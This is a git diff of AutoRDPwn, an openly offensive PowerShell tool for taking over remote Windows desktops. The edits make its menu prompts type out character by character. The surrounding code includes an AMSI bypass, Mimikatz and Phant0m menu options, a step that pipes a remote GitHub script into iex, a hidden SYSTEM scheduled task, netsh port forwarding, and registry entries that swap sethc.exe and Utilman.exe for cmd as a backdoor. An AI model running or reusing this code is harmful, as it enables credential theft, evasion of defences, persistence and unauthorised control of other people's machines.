@@ -53,7 +53,8 @@ function Test-Command {
     Finally {$ErrorActionPreference=$oldPreference}}
     
     do { Show-Banner ; Show-Language
-    $input = Read-Host -Prompt "Choose your language"
+    $Random = New-Object System.Random ; "Choose your language" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+    $input = Read-Host -Prompt " "
     switch ($input) { 
        '1' { $Language = 'English' } 
        '2' { $Language = 'Spanish' } 
@@ -179,7 +180,8 @@ if($Language -in 'Spanish') {
     if($system -in '64 bits') { $Host.UI.RawUI.ForegroundColor = 'Black' ; Bypass-AMSI } else { $null }}
 
     do { Show-Banner ; Show-Menu
-    $input = Read-Host -Prompt "$txt5"
+    $Random = New-Object System.Random ; $txt5 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+    $input = Read-Host -Prompt " "
     switch ($input) {
 
         '1' {
@@ -277,9 +279,12 @@ if($Language -in 'Spanish') {
 
         'M' {
         Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - $txt9a" ; Write-Host "[3] - $txt9b" ; Write-Host "[4] - Remote Desktop Forensics"
-        Write-Host "[5] - Sticky Keys Hacking" ; Write-Host "[6] - Local Port Forwarding" ; Write-Host "[M] - $txt11" ; Write-Host "" ; $module = Read-Host -Prompt "$txt6" ; Write-Host ""
+        Write-Host "[5] - Sticky Keys Hacking" ; Write-Host "[6] - Local Port Forwarding" ; Write-Host "[M] - $txt11" ; Write-Host ""
+        $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+        $module = Read-Host -Prompt " " ; Write-Host ""
         if($module -like '1') { Show-Banner ; Write-Host "[1] - $txt7a" ; Write-Host "[2] - $txt7b" ; Write-Host "[M] - $txt11" ; Write-Host ""
-        $mimikatz = Read-Host -Prompt "$txt6" ; Write-Host ""
+        $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+        $mimikatz = Read-Host -Prompt " " ; Write-Host ""
 
         if($mimikatz -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
@@ -309,7 +314,8 @@ if($Language -in 'Spanish') {
         Invoke-Phant0m ; pause }
 
         if($module -like '4') { Show-Banner ; Write-Host "[1] - $txt7c" ; Write-Host "[2] - $txt7d" ; Write-Host "[M] - $txt11" ; Write-Host ""
-        $forensics = Read-Host -Prompt "$txt6" ; Write-Host ""
+        $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+        $forensics = Read-Host -Prompt " " ; Write-Host ""
         if($forensics -like '1') { Write-Host "$txt10" -ForegroundColor Green ; Write-Host "" ; Write-Host "$txt9c" -ForegroundColor Magenta
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex 
         explorer $env:temp\Recovered_RDP_Session ; Write-Host "" ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force }
@@ -321,7 +327,8 @@ if($Language -in 'Spanish') {
         if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt10" -ForegroundColor Green }
 	
         if($module -like '6') { Show-Banner ; Write-Host "[1] - $txt8c" ; Write-Host "[2] - $txt8d" ; Write-Host "[3] - $txt9d" ; Write-Host "[M] - $txt11" ; Write-Host ""
-        $forwarding = Read-Host -Prompt "$txt6" ; Write-Host "" ; if($forwarding -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; Write-Host ""
+        $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+        $forwarding = Read-Host -Prompt " " ; Write-Host "" ; if($forwarding -like '1') { Write-Host "$txt10" -ForegroundColor Green ; sleep -milliseconds 1000 ; Write-Host ""
         $lport = Read-Host -Prompt "$txt31" ; Write-Host "" ; $lhost = Read-Host -Prompt "$txt32" ; Write-Host "" ; $rport = Read-Host -Prompt "$txt33" ; Write-Host "" ; $rhost = Read-Host -Prompt "$txt34"
         netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt35" -ForegroundColor Yellow ; sleep -milliseconds 1000 }
         
@@ -347,8 +354,9 @@ if($Language -in 'Spanish') {
    $session = get-pssession ; if ($session){ 
 
         do { $Host.UI.RawUI.ForegroundColor = 'Gray'
-	if ($stickykeys){ $input = "control" } else {
-        Write-Host "" ; $input = Read-Host -Prompt "$txt19" }
+	if ($stickykeys){ $input = "control" } else { Write-Host "" ; 
+        $Random = New-Object System.Random ; $txt19 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
+        $input = Read-Host -Prompt " " }
         switch -wildcard ($input) {
 
         'ver' { $control = "false" ; Write-Host "" ;
@@ -423,7 +431,8 @@ echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
-Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ;  Write-Host "$txt28" ; sleep -milliseconds 3000 
+Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' 
+$Random = New-Object System.Random ; $txt28 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))} ; sleep -milliseconds 3000 
 if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock { 
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
